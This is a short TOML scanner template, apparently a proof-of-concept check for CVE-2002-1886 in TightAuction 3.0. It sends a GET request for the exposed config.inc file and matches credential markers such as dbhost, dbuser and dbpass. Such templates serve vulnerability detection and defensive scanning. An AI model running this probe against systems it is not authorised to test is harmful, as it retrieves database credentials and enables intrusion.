[info]
author = "ave"
description = "检测 TightAuction 3.0 是否存在 config.inc 信息泄露漏洞，通过直接请求 config.inc 文件验证是否可获取数据库凭据"
id = "POC-AVE-2002-0715"
name = "TightAuction 3.0 config.inc Information Disclosure PoC"
severity = "medium"
tags = ["ave-2002-0715"]
vuln_id = [
    "CVE-2002-1886",
    "AVE-2002-0715",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/config.inc"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "dbhost",
    "dbuser",
    "dbpass",
    "mysql_connect",
    "$host",
    "$user",
    "$password",
]
